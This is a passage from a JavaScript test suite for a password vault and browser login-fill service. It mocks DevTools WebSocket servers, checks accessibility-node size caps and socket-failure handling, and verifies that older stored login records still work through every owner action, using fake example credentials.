              else if (m.method === 'Target.attachToTarget') sock.send(JSON.stringify({ id: m.id, result: { sessionId: 's-cap' } }));
              else if (m.method === 'Page.getFrameTree') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { frameTree: { frame: { id: 'F-CAP', url: 'https://shop.example.test/login', securityOrigin: 'https://shop.example.test' } } } }));
              else if (m.method === 'Page.createIsolatedWorld') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { executionContextId: 7 } }));
              else if (m.method === 'Runtime.evaluate') {
                if (m.params?.returnByValue === false) sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { objectId: 'obj-cap' } } }));
                else sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { value: { ok: true, isoOrigin: 'https://shop.example.test', isoHref: 'https://shop.example.test/login' } } } }));
              } else if (m.method === 'Accessibility.queryAXTree') {
                if (!capturedQuery) capturedQuery = m.params;
                sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { nodes: [] } }));
              } else sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
            });
          });
          await wCap2.arm('bp-cap2');
          await wCap2.noteSnapshot(
            { profileId: 'bp-cap2', browserKey: 'bk-mr24' },
            { parsedRefs: [{ ref: '@e1', role: overLongRole, name: overLongName, nth: 0 }], targetId: 'T-CAP' },
          );
          await wCap2.fillVaultField({ profileId: 'bp-cap2', browserKey: 'bk-mr24' }, {
            target: '@e1', spec: 'shop.example.test#alice/password', checkOnly: true, facts: { conversationKeys: ['conv-mr24'] },
          });
          wCap2.shutdown();
          ok(snapCapRes.ok && Boolean(capturedQuery) && capturedQuery.accessibleName.length === 2048 && capturedQuery.role.length === 128,
            'A3 (Hub noteSnapshot cap): Hub itself truncates @ref name to 2048 chars and role to 128 chars without relying on CLI',
            { nameLen: capturedQuery?.accessibleName?.length, roleLen: capturedQuery?.role?.length });
        } finally {
          await new Promise((r) => capWss.close(r));
        }

        // 2. Standing watch server (`maxPayload: 16 MiB` client) that answers `queryAXTree` with `8,000 × 2,048`-char nodes (`16.71 MiB`) + 3 short-socket failure peers!
        let watchAxCalls = 0;
        const bigNodesJson = (() => {
          const bigName = 'X'.repeat(2048);
          const nodes = Array.from({ length: 8000 }, (_, i) => ({
            nodeId: String(i + 1), ignored: false, role: { type: 'role', value: 'textbox' }, name: { type: 'computedString', value: bigName }, backendDOMNodeId: i + 100,
          }));
          return JSON.stringify({ nodes });
        })();
        const watchWss = new WebSocketServer({ port: 0, host: '127.0.0.1', maxPayload: 64 * 1024 * 1024 });
        await new Promise((r) => watchWss.once('listening', r));
        watchWss.on('connection', (sock) => {
          sock.on('message', (raw) => {
            const m = JSON.parse(String(raw));
            if (m.method === 'Accessibility.queryAXTree') {
              watchAxCalls++;
              sock.send(`{"id":${m.id},"result":${bigNodesJson}}`);
            } else if (m.method === 'Page.createIsolatedWorld') {
              sock.send(JSON.stringify({ id: m.id, result: { executionContextId: 1 } }));
            } else if (m.method === 'Runtime.evaluate') {
              sock.send(JSON.stringify({ id: m.id, result: { result: { objectId: 'obj-w' } } }));
            } else if (m.method === 'Page.getFrameTree') {
              sock.send(JSON.stringify({ id: m.id, result: { frameTree: { frame: { id: 'F-TOP' } } } }));
            } else {
              sock.send(JSON.stringify({ id: m.id, result: {} }));
            }
          });
        });

        const attachErrWss = new WebSocketServer({ port: 0, host: '127.0.0.1' });
        await new Promise((r) => attachErrWss.once('listening', r));
        attachErrWss.on('connection', (sock) => {
          sock.on('message', (raw) => {
            const m = JSON.parse(String(raw));
            if (m.method === 'Target.attachToTarget') sock.send(JSON.stringify({ id: m.id, error: { code: -32000, message: 'No target with given id' } }));
          });
        });

        const maxNodesWss = new WebSocketServer({ port: 0, host: '127.0.0.1' });
        await new Promise((r) => maxNodesWss.once('listening', r));
        maxNodesWss.on('connection', (sock) => {
          sock.on('message', (raw) => {
            const m = JSON.parse(String(raw));
            if (m.method === 'Target.attachToTarget') sock.send(JSON.stringify({ id: m.id, result: { sessionId: 's-mn' } }));
            else if (m.method === 'Page.createIsolatedWorld') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { executionContextId: 1 } }));
            else if (m.method === 'Runtime.evaluate') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { objectId: 'obj-mn' } } }));
            else if (m.method === 'Accessibility.queryAXTree') {
              const nodes9k = Array.from({ length: 9000 }, (_, i) => ({ nodeId: String(i + 1), backendDOMNodeId: i + 1 }));
              sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { nodes: nodes9k } }));
            } else sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
          });
        });

        const rawTcpSockets = new Set();
        const noUpgradeTcp = net.createServer((sock) => {
          rawTcpSockets.add(sock);
          sock.resume();
          sock.on('close', () => rawTcpSockets.delete(sock));
          sock.on('error', () => rawTcpSockets.delete(sock));
        });
        await new Promise((r) => noUpgradeTcp.listen(0, '127.0.0.1', r));

        const standingWatch = new WebSocket(`ws://127.0.0.1:${watchWss.address().port}`, { maxPayload: 16 * 1024 * 1024 });
        standingWatch.on('error', () => {});
        await new Promise((r) => standingWatch.once('open', r));
        let wSeq = 0;
        const wPend = new Map();
        standingWatch.on('message', (d) => {
          const m = JSON.parse(String(d));
          if (m.id && wPend.has(m.id)) { const fn = wPend.get(m.id); wPend.delete(m.id); fn(m); }
        });
        standingWatch.on('close', () => {
          for (const [, fn] of wPend) fn({ error: { message: 'watch closed' } });
          wPend.clear();
        });
        const watchCall = (method, params = {}) => new Promise((res) => {
          if (standingWatch.readyState !== 1) return res({ error: { message: 'watch not open' } });
          const id = ++wSeq;
          wPend.set(id, res);
          standingWatch.send(JSON.stringify({ id, method, params }));
        });

        try {
          const dp = await deadPort();
          const ftStub = { frame: { id: 'F-TOP' } };
          const refDesc = { ref: '@e1', role: 'textbox', name: 'Email', nth: 0 };

          // Leg (1): ECONNREFUSED on short socket
          const rRefused = await LF.resolveSnapshotRef({
            wsUrl: `ws://127.0.0.1:${dp}`, call: watchCall, targetId: 'T-1', frameTree: ftStub, parsedRef: refDesc, timeoutMs: 400,
          });
          // Leg (2): Target.attachToTarget CDP error on short socket
          const rAttachErr = await LF.resolveSnapshotRef({
            wsUrl: `ws://127.0.0.1:${attachErrWss.address().port}`, call: watchCall, targetId: 'T-1', frameTree: ftStub, parsedRef: refDesc, timeoutMs: 400,
          });
          // Leg (3): TCP accepts connection and NEVER sends HTTP 101 upgrade
          const rNoUpgrade = await LF.resolveSnapshotRef({
            wsUrl: `ws://127.0.0.1:${noUpgradeTcp.address().port}`, call: watchCall, targetId: 'T-1', frameTree: ftStub, parsedRef: refDesc, timeoutMs: 300,
          });
          await new Promise((r) => setTimeout(r, 60));
          const lingeringTcpAfter = rawTcpSockets.size;
          // Leg (4): >8,192 nodes names `ax_nodes_exceeded`
          const rNodesCap = await LF.resolveSnapshotRef({
            wsUrl: `ws://127.0.0.1:${maxNodesWss.address().port}`, call: watchCall, targetId: 'T-1', frameTree: ftStub, parsedRef: refDesc, timeoutMs: 1000, maxNodes: 8192,
          });

          ok(!rRefused.ok && rRefused.code === 'target_not_found' && rRefused.reason === 'ax_connect_failed' && /short accessibility connection failed/i.test(rRefused.error)
            && !rAttachErr.ok && rAttachErr.code === 'target_not_found' && rAttachErr.reason === 'ax_connect_failed' && /attach failed/i.test(rAttachErr.error)
            && !rNoUpgrade.ok && rNoUpgrade.code === 'target_not_found' && rNoUpgrade.reason === 'ax_timeout'
            && !rNodesCap.ok && rNodesCap.code === 'target_not_found' && rNodesCap.reason === 'ax_nodes_exceeded' && /8192 accessibility nodes/.test(rNodesCap.error)
            && watchAxCalls === 0 && standingWatch.readyState === 1 && lingeringTcpAfter === 0,
            'A3 (short-socket-only): ECONNREFUSED, attach error, and non-upgrading TCP peer all refuse target_not_found naming cause with 0 watch calls, watch open, and 0 lingering TCP sockets',
            { rRefused, rAttachErr, rNoUpgrade, rNodesCap, watchAxCalls, watchState: standingWatch.readyState, lingeringTcpAfter });

          // Mutant 21 (A3): restore r24's fallback onto `call` (standing watch) when short socket fails -> 8,000 × 2,048-char reply (16.71 MiB) closes standing watch with 1006!
          const m21LfSrc = lfSrc
            .replace(
              'async function resolveSnapshotRef({\n  wsUrl = \'\',\n  WebSocketImpl = null,\n  targetId = null,',
              'async function resolveSnapshotRef({\n  wsUrl = \'\',\n  WebSocketImpl = null,\n  call = null,\n  targetId = null,',
            )
            .replace(
              "    const cause = String((shortSess && shortSess.error) || 'connection failed').slice(0, 160);\n    return {\n      ok: false,\n      code: 'target_not_found',\n      reason: 'ax_connect_failed',\n      error: `element ${key} could not be resolved because the short accessibility connection failed (${cause}) — pass a CSS selector to fill --vault instead`,\n    };\n  }\n\n  const send = shortSess.send;\n  const isTooLarge = shortSess.isTooLarge;\n  const isTimedOut = shortSess.isTimedOut;",
              "  }\n  const useShort = shortSess && shortSess.ok ? shortSess : null;\n  const send = useShort ? useShort.send : makeSend(call, null, undefined);\n  const isTooLarge = useShort ? useShort.isTooLarge : () => false;\n  const isTimedOut = useShort ? useShort.isTimedOut : () => false;",
            )
            .replace(
              '    const tgts = await shortSess.browserSend(\'Target.getTargets\', {});',
              '    const tgts = useShort ? await useShort.browserSend(\'Target.getTargets\', {}) : null;',
            )
            .replace(
              '  } finally {\n    await shortSess.close();\n  }',
              '  } finally {\n    if (shortSess && shortSess.close) await shortSess.close();\n  }',
            );
          const LF_M21 = m21LfSrc !== lfSrc ? MUT.load('src/server/browser-login-fill.js', m21LfSrc, 'a3-short-socket-falls-back-to-watch') : null;
          if (LF_M21) {
            let closeCode = 0;
            standingWatch.once('close', (c) => { closeCode = c; });
            await LF_M21.resolveSnapshotRef({
              wsUrl: `ws://127.0.0.1:${dp}`, call: watchCall, targetId: 'T-1', frameTree: ftStub, parsedRef: refDesc, timeoutMs: 400,
            });
            await new Promise((r) => setTimeout(r, 40));
            ok(watchAxCalls === 1 && standingWatch.readyState === 3 && closeCode === 1006,
              'MUTANT 21 RED (A3 short-socket-falls-back-to-watch): falling back to standing watch sends queryAXTree over watch and 16.71 MiB reply drops watch with code 1006',
              { watchAxCalls, watchState: standingWatch.readyState, closeCode });
          } else ok(false, 'MUTANT 21 RED (A3): anchor not found');
        } finally {
          try { standingWatch.terminate(); } catch {}
          for (const s of rawTcpSockets) { try { s.destroy(); } catch {} }
          await new Promise((r) => noUpgradeTcp.close(r));
          await new Promise((r) => attachErrWss.close(r));
          await new Promise((r) => maxNodesWss.close(r));
          await new Promise((r) => watchWss.close(r));
        }
      }

      // A5 (r26 Minor 3): ALL 4 browser/vault heavy suites (`test-vault-login-chrome`, `test-browser-site-reset-chrome`,
      // `test-browser-mediation-chrome`, `test-vault-paste-chrome`) exit `2` with `SKIPPED:` (never `ALL PASS`, never `0`) when prerequisites are absent!
      {
        const { spawn } = require('node:child_process');
        const bareBin = path.join(dirM10, 'bare-node-bin');
        fs.mkdirSync(bareBin, { recursive: true });
        fs.symlinkSync(process.execPath, path.join(bareBin, 'node'));
        const runBare = (scriptRel, extraArgs = []) => new Promise((resolve) => {
          const ch = spawn(process.execPath, [path.join(REPO, scriptRel), ...extraArgs], {
            cwd: REPO,
            env: {
              PATH: `${bareBin}:/usr/bin`,
              HOME: dirM10,
              TMPDIR: os.tmpdir(),
              VS_NO_REAL_CLI: '1',
            },
          });
          let out = '';
          ch.stdout.on('data', (d) => { out += d; });
          ch.stderr.on('data', (d) => { out += d; });
          const tm = setTimeout(() => { try { ch.kill('SIGKILL'); } catch {} }, 8000);
          ch.on('close', (status) => { clearTimeout(tm); resolve({ status, out: out.trim() }); });
        });
        const [rVl, rSr, rMedAb, rMedCh, rVpCh] = await Promise.all([
          runBare('scripts/test-vault-login-chrome.mjs'),
          runBare('scripts/test-browser-site-reset-chrome.mjs'),
          runBare('scripts/test-browser-mediation-chrome.mjs'),
          runBare('scripts/test-browser-mediation-chrome.mjs', ['--chrome', '/nonexistent/chrome-bin']),
          runBare('scripts/test-vault-paste-chrome.mjs', ['--chrome', '/nonexistent/chrome-bin']),
        ]);
        ok([rVl, rSr, rMedAb, rMedCh, rVpCh].every((r) => r.status === 2 && /SKIPPED:/i.test(r.out) && !/ALL PASS/i.test(r.out)),
          'A5 (r26 Minor 3): all 4 heavy suites (vault-login, site-reset, mediation, vault-paste) print SKIPPED (never ALL PASS) and exit 2 when agent-browser or chrome is missing',
          { rVl, rSr, rMedAb, rMedCh, rVpCh });
      }

      // ── r26 COMPULSORY 1: Every owner write/read door works on every `.356`–`.390` record shape + rollback round-trip + MUTANT 24 RED ──
      {
        const { execFileSync } = require('node:child_process');
        const VT = require(path.join(REPO, 'src/server/vault-totp.js'));
        const VPD = require(path.join(REPO, 'src/server/vault-paste-door.js'));
        const VC = require(path.join(REPO, 'src/server/vault-contents.js'));

        const dirC1 = path.join(dirM10, 'r26-compulsory-1');
        fs.mkdirSync(dirC1, { recursive: true });

        // Load real `.390` (`05082bbd0`) `src/browser-login.js` + `src/server/browser-logins.js` when git object exists
        // (with exact `.390` flat-schema fallback if running in a shallow clone / git-less export tarball).
        let BL390 = null, LM390 = null;
        if (process.env.VS_TEST_NO_GIT_390 !== '1') {
          try {
            const bl390Raw = execFileSync('git', ['show', '05082bbd0:src/browser-login.js'], { cwd: REPO, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] });
            const lm390Raw = execFileSync('git', ['show', '05082bbd0:src/server/browser-logins.js'], { cwd: REPO, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] });
            const bl390Path = path.join(dirC1, 'bl390.cjs');
            const lm390Path = path.join(dirC1, 'lm390.cjs');
            fs.writeFileSync(bl390Path, bl390Raw.replace("require('./grant-model.js')", `require(${JSON.stringify(path.join(REPO, 'src/grant-model.js'))})`));
            fs.writeFileSync(
              lm390Path,
              lm390Raw
                .replace("require('../browser-login.js')", `require(${JSON.stringify(bl390Path)})`)
                .replace("require('../grant-model.js')", `require(${JSON.stringify(path.join(REPO, 'src/grant-model.js'))})`)
                .replace("require('./grants-store.js')", `require(${JSON.stringify(path.join(REPO, 'src/server/grants-store.js'))})`),
            );
            BL390 = require(bl390Path);
            LM390 = require(lm390Path);
          } catch {
            BL390 = null;
            LM390 = null;
          }
        }
        const oracle390Label = (BL390 && LM390) ? '真实 .390 模块' : '手写形态（git 对象不在）';

        const populateMasterVault = async (vaultDir) => {
          fs.mkdirSync(vaultDir, { recursive: true });
          const vpw = 'R26#MasterVault9';
          const recentNow = Date.now() - 60_000;
          // Step A: Write `rbuser` with tip (`r26`) first, so `.390` can overwrite it in Step B (proving rollback -> `.390` rewrite -> tip).
          {
            const engPre = VE.create({ dataDir: vaultDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
            await engPre.setup(vpw);
            const gPre = GS.create({ memory: true });
            const logPre = Lm.create({ vault: engPre, grants: () => gPre, log: () => {} });
            const totpPre = VT.create({ dataDir: vaultDir, vault: engPre, log: () => {} });
            totpPre.addEntry({ name: 'shop2fa', seed: 'JBSWY3DPEHPK3PXP', issuer: 'Shop', account: 'tuser' }, { who: 'owner' });
            logPre.addOwn({ origin: 'https://shop.example.test', username: 'rbuser', password: 'RbTipInitPw!0' }, { who: 'owner' });
            engPre.close();
          }
          // Step B: Open with `.390` (`05082bbd0`) and write every `.356`–`.390` record shape + overwrite `rbuser`!
          {
            const eng390 = VE.create({ dataDir: vaultDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
            await eng390.unlock(vpw);
            if (BL390 && LM390) {
              const g390 = GS.create({ memory: true });
              const log390 = LM390.create({ vault: eng390, grants: () => g390, log: () => {} });
              log390.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: 'Alice390Pw!1' }, { who: 'owner' });
              log390.addOwn({ origin: 'https://shop.example.test', username: 'tuser', password: 'Tuser390Pw!1', totpName: 'shop2fa' }, { who: 'owner' });
              log390.addOwn({ origin: 'https://shop.example.test', username: 'prevuser', password: 'PrevOld390Pw!1' }, { who: 'owner' });
              log390.addOwn({ origin: 'https://shop.example.test', username: 'prevuser', password: 'PrevCur390Pw!2' }, { who: 'owner' });
              log390.addAgent({ origin: 'https://shop.example.test', username: 'aguser', password: 'AgUser390Pw!1' }, { owner: 'conv-ag', actor: 'Agent 390' });
              log390.addOwn({ origin: 'https://shop.example.test', username: 'rbuser', password: 'RbMaster390Pw!2' }, { who: 'owner' });

              const reg1Rec = BL390.newRecord({ origin: 'https://shop.example.test', username: 'reg1', password: 'Reg1PendingPw!1', source: 'vault-minted', now: recentNow, conversation: 'conv-reg', pending: 'register' });
              eng390.secretPut('web-login:https://shop.example.test#reg1', BL390.textOf(reg1Rec), { kind: 'vault-minted', actor: 'conv-reg', pending: 'register' });

              const reg2Rec = BL390.newRecord({ origin: 'https://shop.example.test', username: 'reg2', password: 'Reg2PendingPw!1', source: 'vault-minted', now: recentNow, conversation: 'conv-reg', pending: 'register' });
              eng390.secretPut('web-login:https://shop.example.test#reg2', BL390.textOf(reg2Rec), { kind: 'vault-minted', actor: 'conv-reg', pending: 'register' });

              const regCardRec = BL390.newRecord({ origin: 'https://shop.example.test', username: 'regcard', password: 'RegCardPw!1', source: 'vault-minted', now: recentNow, conversation: 'conv-reg', pending: 'register' });
              eng390.secretPut('web-login:https://shop.example.test#regcard', BL390.textOf(regCardRec), { kind: 'vault-minted', actor: 'conv-reg', pending: 'register' });

              const carlBase = BL390.newRecord({ origin: 'https://shop.example.test', username: 'carl', password: 'CarlOld390Pw!1', source: 'owner', now: recentNow - 10_000 });
              const carlChg = BL390.changedRecord(carlBase, 'CarlNew390Pw!2', { source: 'vault-minted', now: recentNow, pending: 'change' });
              eng390.secretPut('web-login:https://shop.example.test#carl', BL390.textOf(carlChg), { kind: 'vault-minted', pending: 'change' });
            } else {
              const putFlat = (u, obj, meta = {}) => eng390.secretPut(`web-login:https://shop.example.test#${u}`, JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: u, createdAt: recentNow, ...obj }), { kind: obj.source || 'owner', ...meta });
              putFlat('alice', { by: 'owner', source: 'owner', strength: 'unknown', password: 'Alice390Pw!1' });
              putFlat('tuser', { by: 'owner', source: 'owner', strength: 'unknown', password: 'Tuser390Pw!1', totpName: 'shop2fa' });
              putFlat('prevuser', { by: 'owner', source: 'owner', strength: 'unknown', password: 'PrevCur390Pw!2', previous: { password: 'PrevOld390Pw!1', source: 'owner', strength: 'unknown', replacedAt: recentNow - 5_000 } });
              putFlat('aguser', { by: 'agent', source: 'agent-typed', strength: 'unknown', password: 'AgUser390Pw!1' }, { owner: 'conv-ag', actor: 'Agent 390' });
              putFlat('rbuser', { by: 'owner', source: 'owner', strength: 'unknown', password: 'RbMaster390Pw!2', previous: { password: 'RbTipInitPw!0', source: 'owner', strength: 'unknown', replacedAt: recentNow - 5_000 } });
              putFlat('reg1', { by: 'agent', source: 'vault-minted', strength: 'generated', password: 'Reg1PendingPw!1', pending: 'register' }, { actor: 'conv-reg', pending: 'register' });
              putFlat('reg2', { by: 'agent', source: 'vault-minted', strength: 'generated', password: 'Reg2PendingPw!1', pending: 'register' }, { actor: 'conv-reg', pending: 'register' });
              putFlat('regcard', { by: 'agent', source: 'vault-minted', strength: 'generated', password: 'RegCardPw!1', pending: 'register' }, { actor: 'conv-reg', pending: 'register' });
              putFlat('carl', { by: 'owner', source: 'vault-minted', strength: 'generated', password: 'CarlNew390Pw!2', pending: 'change', previous: { password: 'CarlOld390Pw!1', source: 'owner', strength: 'unknown', replacedAt: recentNow - 5_000 } }, { pending: 'change' });
            }
            eng390.close();
          }
          return vpw;
        };

        const vaultGreenDir = path.join(dirC1, 'green');
        const vaultRedDir = path.join(dirC1, 'red-m24');
        const vpwC1 = await populateMasterVault(vaultGreenDir);
        fs.cpSync(vaultGreenDir, vaultRedDir, { recursive: true });
        const engTip = VE.create({ dataDir: vaultGreenDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
        await engTip.unlock(vpwC1);
        try {
          let tipSecretPuts = 0;
          const origPut = engTip.secretPut.bind(engTip);
          engTip.secretPut = (...a) => { tipSecretPuts++; return origPut(...a); };

          const gTip = GS.create({ memory: true });
          const totpTip = VT.create({ dataDir: vaultGreenDir, vault: engTip, log: () => {} });
          const todosMap = new Map();
          const userTodosStub = {
            add: (_sk, it) => { const id = 'ut-' + (todosMap.size + 1); const rec = { id, status: 'open', ...it }; todosMap.set(id, rec); return rec; },
            get: (id) => todosMap.get(id) || null,
            snapshot: () => ({ open: [...todosMap.values()].filter((x) => x.status === 'open') }),
            setStatus: (id, st) => { const r = todosMap.get(id); if (r) r.status = st; },
            resolveAnswered: (ids, by) => { for (const id of ids || []) { const r = todosMap.get(id); if (r) { r.status = 'done'; r.by = by; } } },
          };
          const logTip = Lm.create({ vault: engTip, grants: () => gTip, totpCode: (n, o) => totpTip.codeForLogin(n, o), log: () => {} });
          const doorTip = VPD.create({ vault: engTip, userTodos: userTodosStub, logins: logTip, log: () => {} });
          const vcTip = VC.create({ vault: engTip, sources: { secrets: () => VC.secretSource({ vault: engTip }) } });

          // Law 0: `recordOf(recordOf(x))` equals `recordOf(x)` on EVERY `.356`–`.390` record in the vault!
          const legacyNames = ['alice', 'tuser', 'prevuser', 'aguser', 'rbuser', 'reg1', 'reg2', 'regcard', 'carl']
            .map((u) => `web-login:https://shop.example.test#${u}`);
          const idempotentAll = legacyNames.every((nm) => {
            const g = engTip.secretGet(nm);
            const raw = g.value.toString('utf8');
            const r1 = BL.recordOf(raw);
            const r2 = BL.recordOf(r1);
            return Boolean(r1 && r2 && JSON.stringify(r1) === JSON.stringify(r2));
          });

          // Door 1: `list()` carries `hasCurrent`, `hasPrevious`, `pending`, `totpName` on all legacy rows (`0` writes)
          const listed = logTip.list();
          const rowOf = (u) => (listed.entries || []).find((e) => e.user === u);
          const listFactsOk = listed.ok
            && rowOf('alice')?.hasCurrent === true && rowOf('alice')?.pending === null
            && rowOf('tuser')?.hasCurrent === true && rowOf('tuser')?.totpName === 'shop2fa'
            && rowOf('prevuser')?.hasCurrent === true && rowOf('prevuser')?.hasPrevious === true
            && rowOf('aguser')?.hasCurrent === true
            && rowOf('rbuser')?.hasCurrent === true && rowOf('rbuser')?.hasPrevious === true
            && rowOf('reg1')?.hasCurrent === false && rowOf('reg1')?.pending === 'register'
            && rowOf('carl')?.hasCurrent === true && rowOf('carl')?.hasPrevious === true && rowOf('carl')?.pending === null;

          // Door 2: `.390` `pending: 'change'` (`carl`) fills the NEW password (`CarlNew390Pw!2`) on `/password` and OLD (`CarlOld390Pw!1`) on `/previous` with `0` writes
          logTip.grant('web-login:https://shop.example.test#carl', 'this-account', 'session:conv-carl');
          const fillCarlCur = logTip.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test#carl/password', facts: { conversationKeys: ['conv-carl'] }, conv: 'conv-carl' });
          const fillCarlPrev = logTip.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test#carl/previous', facts: { conversationKeys: ['conv-carl'] }, conv: 'conv-carl' });
          const zeroWritesAfterReads = tipSecretPuts === 0;

          // Door 3: Vault window `addOwn` updates `.390` `alice` AND rollback-rewritten `rbuser`
          const updAlice = logTip.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: 'AliceTipUpdated!2' }, { who: 'owner' });
          const updRb = logTip.addOwn({ origin: 'https://shop.example.test', username: 'rbuser', password: 'RbTipUpdated!3' }, { who: 'owner' });

          // Door 4: `.390` login request card (`vault-paste-door`) updates existing `.390` `tuser` and writes grant
          const askCard = doorTip.request({
            caller: { conversationId: 'conv-card', scope: 'conv-card', sessionKey: 'sk-card', name: 'Card Agent' },
            words: 'Shop account',
            purpose: 'sign in to shop',
            kind: 'login',
            hosts: ['https://shop.example.test'],
          });
          const ansCard = doorTip.answer(askCard.requestId, {
            answer: 'store',
            person: true,
            login: { username: 'tuser', password: 'TuserUpd!2', totpName: 'shop2fa', allow: true },
          });

          // Door 5: Takeover "Save login" card (`offerOwnerSaveCard` + `answerCard`) updates `.390` `prevuser`
          const tkOffer = logTip.offerOwnerSaveCard({ origin: 'https://shop.example.test', username: 'prevuser', password: 'PrevTkUpd!3' });
          const tkAns = logTip.answerCard(tkOffer.id, { approve: true, shown: tkOffer.shown, who: 'owner' });

          // Door 6: `--generate` password change on `.390` `aguser`
          const genChg = logTip.resolveFill({
            tabOrigin: 'https://shop.example.test',
            spec: 'shop.example.test#aguser/password',
            generate: true,
            facts: { conversationKeys: ['conv-ag'] },
            conv: 'conv-ag',
            owners: ['conv-ag'],
          });

          // Door 7: Owner `confirmOwn`, `discardPending`, AND For-you `answerCard` on `.390` `pending: 'register'` entries
          const cfmReg1 = logTip.confirmOwn('web-login:https://shop.example.test#reg1', { who: 'owner' });
          const dscReg2 = logTip.discardPending('web-login:https://shop.example.test#reg2', { who: 'owner' });
          const regCardId = 'sl-' + crypto.createHash('sha256').update('pending\u0000web-login:https://shop.example.test#regcard\u00001').digest('hex').slice(0, 8);
          const regCardView = logTip.cardOf(regCardId);
          const ansRegCard = regCardView ? logTip.answerCard(regCardId, { approve: true, shown: regCardView.shown, who: 'owner' }) : { ok: false };

          // Door 8: Vault window Reveal (`vault-contents`), `Use for…` (`grant`/`ungrant`), and Delete (`drop`)
          const revWin = await vcTip.startReveal('owner', vpwC1);
          const revCarl = vcTip.reveal('owner', revWin.page, 'secrets:web-login:https://shop.example.test#carl#password');
          const revAlice = vcTip.reveal('owner', revWin.page, 'secrets:web-login:https://shop.example.test#alice#password');
          const grantAlice = logTip.grant('web-login:https://shop.example.test#alice', 'this-account', 'session:conv-alice');
          const ungrantAlice = logTip.ungrant(grantAlice.resource, 'conversation:conv-alice');
          const dropCarl = logTip.drop('web-login:https://shop.example.test#carl', { who: 'owner' });
          const carlGoneAfterDrop = !(logTip.list().entries || []).some((e) => e.user === 'carl');

          ok(idempotentAll
            && listFactsOk
            && fillCarlCur.ok && fillCarlCur.value === 'CarlNew390Pw!2'
            && fillCarlPrev.ok && fillCarlPrev.value === 'CarlOld390Pw!1'
            && zeroWritesAfterReads
            && updAlice.ok && updAlice.updated === true
            && updRb.ok && updRb.updated === true
            && askCard.ok && ansCard.ok && ansCard.updated === true && ansCard.allowed === true
            && tkOffer.ok && tkOffer.update === true && tkAns.ok && tkAns.saved === true && tkAns.updated === true
            && genChg.ok && genChg.generated === true && genChg.pending === 'change'
            && cfmReg1.ok && cfmReg1.confirmed === true && cfmReg1.kind === 'register'
            && dscReg2.ok && dscReg2.discarded === true && dscReg2.dropped === true
            && Boolean(regCardView) && ansRegCard.ok && ansRegCard.confirmed === true
            && revCarl.ok && revCarl.value === 'CarlNew390Pw!2'
            && revAlice.ok && revAlice.value === 'AliceTipUpdated!2'
            && grantAlice.ok && ungrantAlice.ok
            && dropCarl.ok && carlGoneAfterDrop,
            `r26 Compulsory 1 [${oracle390Label}]: recordOf is strictly idempotent and EVERY owner door (list facts, .390 pending:change fill, window update, .390 login card update+grant, takeover save card, --generate change, confirm, discard, pending card, reveal, grant/ungrant, delete) works on .356-.390 and rollback-rewritten entries`,
            { idempotentAll, listFactsOk, fillCarlCur: fillCarlCur.value, fillCarlPrev: fillCarlPrev.value, zeroWritesAfterReads, updAlice, updRb, ansCard, tkAns, genChg: { ok: genChg.ok, pending: genChg.pending }, cfmReg1, dscReg2, ansRegCard, revCarl: revCarl.ok, revAlice: revAlice.ok, dropCarl, carlGoneAfterDrop });
        } finally {
          engTip.close();
        }

        // MUTANT 24 RED (Compulsory 1): restore r25's non-idempotent `let schema = 1;` in `recordOf` -> ALL 7 owner-door regressions reproduce RED on `.390` vault!
        const m24BlSrc = blSrc
          .replace('  const schema = 2;', '  let schema = 1;')
          .replace('  if (hasThreeSlotShape) {\n    if (r.schema === 1) return null;', '  if (hasThreeSlotShape) {\n    if (r.schema === 1) return null;\n    schema = 2;');
        if (m24BlSrc !== blSrc) {
          const blM24Path = MUT.write('src/browser-login.js', m24BlSrc, 'r26-c1-non-idempotent-recordof', { name: 'r26-c1-bl' });
          const BL_M24 = require(blM24Path);
          const m24LgSrc = lgSrc.replace("require('../browser-login.js')", `require(${JSON.stringify(blM24Path)})`);
          const LM_M24 = MUT.load('src/server/browser-logins.js', m24LgSrc, 'r26-c1-non-idempotent-logins');
          const engM24 = VE.create({ dataDir: vaultRedDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
          await engM24.unlock(vpwC1);
          try {
            const gM24 = GS.create({ memory: true });
            const logM24 = LM_M24.create({ vault: engM24, grants: () => gM24, log: () => {} });
            const todosM24 = new Map();
            const doorM24 = VPD.create({
              vault: engM24,
              logins: logM24,
              log: () => {},
              userTodos: {
                add: (_sk, it) => { const id = 'utm-' + (todosM24.size + 1); const rec = { id, status: 'open', ...it }; todosM24.set(id, rec); return rec; },
                get: (id) => todosM24.get(id) || null,
                snapshot: () => ({ open: [...todosM24.values()] }),
                setStatus() {},
              },
            });
            const rawAlice24 = engM24.secretGet('web-login:https://shop.example.test#alice').value.toString('utf8');
            const twiceNull = BL_M24.recordOf(BL_M24.recordOf(rawAlice24)) === null;
            const mUpd = logM24.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: 'New' }, { who: 'owner' });
            const mAsk = doorM24.request({ caller: { conversationId: 'c24', scope: 'c24', sessionKey: 's24', name: 'A' }, words: 'w', purpose: 'p', kind: 'login', hosts: ['https://shop.example.test'] });
            const mCard = doorM24.answer(mAsk.requestId, { answer: 'store', person: true, login: { username: 'tuser', password: 'New', allow: true } });
            const mTkOffer = logM24.offerOwnerSaveCard({ origin: 'https://shop.example.test', username: 'prevuser', password: 'New' });
